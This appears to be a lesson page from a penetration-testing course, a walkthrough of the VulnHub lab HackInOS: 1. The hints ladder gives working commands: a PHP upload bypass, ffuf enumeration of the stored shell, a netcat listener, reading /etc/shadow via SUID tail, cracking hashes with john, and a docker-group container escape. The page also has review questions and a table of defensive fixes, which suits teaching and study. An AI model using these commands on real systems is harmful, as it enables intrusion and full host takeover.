# Machine 13 — HackInOS: 1

> **Position:** 13 of 13 · the final box · **Band 3 — Easy** (global rank **040** of 708)
> **Full writeup:** [`labs/3-040-hackinos-1/README.md`](../../labs/3-040-hackinos-1/README.md)

| | |
| --- | --- |
| **Machine** | HackInOS: 1 |
| **Author** | Fatih Çelik |
| **Released** | 9 March 2019 |
| **Target** | Ubuntu — Apache on **:8000**, OpenSSH 7.6p1, a **Docker** container hosting the web app |
| **VulnHub** | [entry/hackinos-1,295](https://vulnhub.com/entry/hackinos-1,295/) |
| **Flags** | `/root/flag` on the **host** |
| **Estimated time** | 6–9 hours |

---

## Why this machine is the finale

It combines everything the path has taught and adds two things you have not met:

1. **Reading the developer's own published source code.** After a successful upload the
   page contains an HTML comment linking to the author's **GitHub**, where
   `upload.php` is public. You are not guessing at the filter — you are *reading it*.
   That is exactly how real application assessments work when you get a source-code
   review, and it teaches you to derive the bypass from the code rather than from a
   list of tricks.
2. **A container escape.** Your shell lands in a **Docker container**, so `root`
   inside it is not root on the host. The goal changes mid-machine from "root the box"
   to "escape the container" — and the escape is a **group-membership** issue
   (`docker`), not a vulnerability in any software.

In between it teaches a beautiful piece of reasoning about **predictable randomness**:
PHP's `md5($name . rand(1, 100))` looks like an unguessable filename, but `rand(1,100)`
has only **100 possible values** and *you chose the original name* — so the destination
filename is fully enumerable, and `ffuf` finds it in about a second.

## Learning objectives

1. Notice a **non-standard web port** (8000) and understand why `-p-` was essential.
2. Apply the **`/etc/hosts` trick** for an application hard-coded to `localhost`.
3. **Read source code** to derive an upload bypass instead of guessing.
4. Understand what a **declared-but-unused allow-list** means in practice.
5. Defeat a **MIME magic-byte check** by prepending a real image header.
6. Reason about **predictable randomness** and enumerate only the real candidate space.
7. Use **`ffuf`** with a generated wordlist and `-mc 200`.
8. **Recognise that you are inside a container** and adjust your goal.
9. Escalate via **SUID `tail`** to read `/etc/shadow`, then crack **MD5-crypt** hashes.
10. Escape via **`docker` group membership**, and know the `lxd` and PATH-hijack
    alternatives.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Non-standard web port, no port 80 | **:8000** — missed by any default scan |
| **Hard-coded `localhost`** in the form action | `index.html` → forces the `/etc/hosts` trick |
| **Developer's vulnerable source published on GitHub** | HTML comment after upload links to `upload.php` |
| **Extension allow-list declared but never enforced** | `$allowed_ext` unused → `.php` stored |
| **MIME check inspects magic bytes only** | `finfo_file()` → a GIF/PNG header defeats it |
| **Predictable "random" filename** | `md5($name . rand(1, 100))` → **100 candidates** |
| Uploads inside the document root | `/var/www/html/uploads/` → executed by Apache |
| **SUID `tail`** | `/usr/bin/tail` (in the container) → read `/etc/shadow` |
| **Weak MD5-crypt hashes** | `root : john`, `hummingbirdscyber : 123456` — cracked in seconds |
| **Credential reuse: container → host SSH** | port 22 |
| **`docker` group = host root** | `999(docker)` |
| `lxd` group (alternative) | `108(lxd)` |
| **SUID + PATH hijack (alternative)** | `~/a.out` calls `whoami` via `$PATH`; `~/bin` is writable and first |
| Mitigating factor | No `gcc`/`nc` in the slim container image — so the intended path is the escape |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§6** — the whole file-upload section,
  especially the **bypass table**, which has an entry keyed to this machine.
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md)
  **§5** — container detection and the escape bridges. Read it *before* you get the
  shell, so you are not surprised.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID),
  **§7** (PATH) and **§8** (groups — `docker`, `lxd`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 (recognising
  `$1$` MD5-crypt) and §4 (John).
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) §4 (SSH).

## Before you start — answer these

1. Your scan shows 22 and 8000 but no 80. Why is that *not* a sign of a hardened box?
2. A form's `action` attribute points at `http://localhost:8000/upload.php`. What
   happens when you submit it from your machine, and how do you fix it?
3. `finfo_file()` says `image/png`. What exactly did it check, and what did it *not*
   check?
4. `md5($name . rand(1, 100))` — how many possible filenames are there, given that you
   chose `$name`?
5. `id` says `uid=0(root)` and you still cannot read the flag. What are three ways to
   confirm why?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

`sudo nmap -sC -sV -p- TARGET` → **22** and **8000**. Browse to `:8000`. There is a
file-upload form.

Try to submit it. It will appear to do nothing, or fail oddly. Look at the form's
**`action`** attribute in the page source. Then read the author's note on the VulnHub
page: *"localhost is meant to be there!"*

Fix the name resolution, and upload something. **After** a successful upload, look at
the response's HTML source again. There is a comment you have not seen before.
</details>

<details>
<summary><strong>Rung 2 — read the source</strong></summary>

`localhost` is special-cased and cannot simply be overridden while `127.0.0.1
localhost` exists. Give the target a hostname instead (e.g. `hackinos`) in
`/etc/hosts`, and either intercept the POST in Burp and rewrite the `Host`, or POST
directly with `curl`.

Then follow the HTML comment to the developer's **GitHub** and read `upload.php`.
Three lines matter:

```php
$allowed_ext = ['png','jpg','jpeg','gif'];     // declared…
// …and never actually used to reject anything
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);   // magic bytes only
$newname = md5($name . rand(1, 100)) . "." . $ext;         // YOUR extension is kept
```

So: the **extension is preserved** (lower-cased), and the MIME check only inspects the
**magic bytes at the start of the file**. Upload **`cmd.php`** whose first bytes are a
real **PNG** header.
</details>

<details>
<summary><strong>Rung 3 — find the stored filename</strong></summary>

The file is stored as `md5("cmd.php" . N) . ".php"` for `N` in **1..100**. That is
100 candidates — generate them:

```bash
for i in $(seq 1 100); do
  printf '%s\n' "$(printf 'cmd.php%d' "$i" | md5sum | cut -d' ' -f1).php"
done > candidates.txt
wc -l candidates.txt      # 100

ffuf -u http://hackinos:8000/uploads/FUZZ -w candidates.txt -mc 200
```

If `ffuf` finds nothing, the string you hashed does not match what PHP hashed —
check whether the extension was included, and whether it was lower-cased.

Trigger the hit with `nc -lvnp 4444` listening. You land as **`www-data`**.
</details>

<details>
<summary><strong>Rung 4 — you are in a container</strong></summary>

Check where you are:

```bash
ls -la /.dockerenv          # present
cat /proc/1/cgroup | head   # docker entries
hostname                    # a container ID, e.g. 1afdd1f6b82c
```

**You are inside Docker.** `root` here is not root on the host. Escalate *inside* the
container first:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/tail     <- never SUID on a normal system
tail -n +2 /etc/shadow
```

Two MD5-crypt (`$1$`) hashes: `root` and `hummingbirdscyber`. Copy them out and crack
locally:

```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# root:john      hummingbirdscyber:123456
su root          # container root
```

**The bridge to the host:** the same credential works for **SSH on port 22**:

```bash
ssh hummingbirdscyber@hackinos     # 123456
id                                 # …,999(docker),108(lxd)
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **22** (OpenSSH 7.6p1) and **8000** (Apache). **No port 80.**
2. The upload form's action is hard-coded to `http://localhost:8000/upload.php` →
   give the target a hostname in `/etc/hosts` (e.g. `hackinos`) and craft/intercept
   the POST.
3. After a successful upload, an **HTML comment links to the developer's GitHub**,
   where `upload.php` is public: `$allowed_ext` is declared but **unused**;
   `finfo_file()` checks **magic bytes only**; `$newname = md5($name . rand(1,100))
   . "." . $ext` — **your extension is kept**.
4. Upload **`cmd.php`** with a real **PNG magic header** → stored in
   `/var/www/html/uploads/`.
5. Generate the **100** candidate names (`md5("cmd.php" . N) + ".php"`) and
   **`ffuf`** for the one that returns 200 → **RCE as `www-data`**.
6. `/.dockerenv` → **inside a container**. `find / -perm -4000` → **SUID
   `/usr/bin/tail`** → `tail -n +2 /etc/shadow` → MD5-crypt hashes.
7. `john --format=md5crypt` → **`root : john`**, **`hummingbirdscyber : 123456`** →
   `su root` (container root).
8. **Credential reuse:** `ssh hummingbirdscyber@host` with `123456` → host foothold;
   `id` shows **`999(docker)`**.
9. `docker run -v /:/host --rm -it ubuntu chroot /host` → **host root** →
   **`/root/flag`**.
   **Alternatives:** the **`lxd`** group (`108`), and a SUID `~/a.out` that calls
   `whoami` via `$PATH` with a writable `~/bin` first in the path.
</details>

## After you finish — review questions

1. Why was the missing port 80 a *hint* rather than a dead end?
2. Explain the `/etc/hosts` problem precisely: why can't you just add
   `TARGET localhost` while `127.0.0.1 localhost` exists?
3. You read the developer's source. Name the three distinct bugs in `upload.php`, and
   say which one alone would have been enough.
4. `rand(1, 100)` is not cryptographically secure. Would using `random_int()` have
   fixed the problem? What *would* have?
5. Why did prepending a PNG header satisfy `finfo_file()` while PHP still executed the
   file? What single server-side change defeats this?
6. What told you that you were inside a container, and how did your objective change at
   that moment?
7. SUID `tail` gave you `/etc/shadow` but not root. Explain the two-step reasoning
   that turned a *read* into a *login*.
8. `docker` group membership is root. Explain the mechanism, and name the audit
   question a defender should ask.
9. You had three independent host-root paths. In a professional report, how do you
   present them?
10. The container had no `gcc` and no `nc`. Did that make it secure? What did it
    actually change?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Web app on :8000, no :80 | Port choice is not a control. Authenticate, firewall, and monitor every listener you expose |
| **Hard-coded `localhost` in the form action** | Use relative URLs. A development-time base URL left in production is a configuration-management failure |
| **Vulnerable source published on GitHub and linked from the page** | Never link internal repositories from served pages; review what your code exposes publicly |
| `$allowed_ext` declared but unused | **Dead code is a finding.** If you write a control, test that it fires. Add a test that uploads a `.php` and asserts rejection |
| MIME check via `finfo_file()` only | Magic bytes are trivially forged. Validate the extension against an allow-list **server-side**, and **re-encode** the image (which strips appended data) |
| `md5($name . rand(1,100))` | Use `random_bytes()`/`random_int()` — but the real fix is not to rely on filename secrecy at all |
| Uploads in `/var/www/html/uploads/` | Store outside the document root; serve via a download script with `Content-Disposition: attachment`; `php_admin_flag engine off` for the directory |
| **SUID `/usr/bin/tail`** | `chmod u-s`. Audit SUID in *every* image, including containers |
| MD5-crypt with `john` / `123456` | Use yescrypt/argon2; enforce a password policy; check against breached-password lists |
| **Container password reused for host SSH** | Unique credentials per system. One reuse turned a container compromise into a host compromise |
| **Host user in the `docker` group** | Remove the membership, or use rootless Docker / Podman. `docker` is root-equivalent — treat it as such in every audit |
| Host user in the `lxd` group | Same: `lxd` allows privileged containers with the host root mounted |
| SUID binary calling `whoami` via `$PATH` | Absolute paths in privileged programs; never let a user-writable directory appear first in `PATH` |
| Slim image with no `gcc`/`nc` | Good practice — it raised the cost. But it did **not** prevent compromise, because the intended path was configuration, not compilation. Defence in depth means fixing the configuration too |

**The single biggest lesson:** *container root is not host root, and group membership
is the bridge.* Nothing here was a software vulnerability in Docker. The escape was a
misconfiguration — a user placed in a group that is root-equivalent by design.

---

## You have finished Learning Path 1

Thirteen machines, thirty-plus attack classes, and every technique in modules
[01](../01-Foundations-Networking-and-Recon.md)–[06](../06-Shells-Persistence-and-Escapes.md)
used at least once in anger.

**What to do now:**

1. Go back to [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md) — you will
   recognise most of its tiers now.
2. Re-do two machines **from memory, without the writeup**. This is where the
   knowledge becomes skill.
3. Step up to **Band 4**. The natural next two are
   [`labs/4-070-basic-pentesting-2`](../../labs/4-070-basic-pentesting-2/README.md)
   (the sequel to Machine 1) and
   [`labs/4-075-dc-9`](../../labs/4-075-dc-9/README.md) (the DC series continues).
4. If you want the five attack classes this path deliberately left out, do the
   **bridge labs** listed in the [path README](../README.md):
   CSRF/RFI, LDAP injection, IDOR, SSH port forwarding, and PHP deserialisation.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 12 — symfonos: 1](12-symfonos-1.md) · full writeup: [`labs/3-040-hackinos-1`](../../labs/3-040-hackinos-1/README.md)._
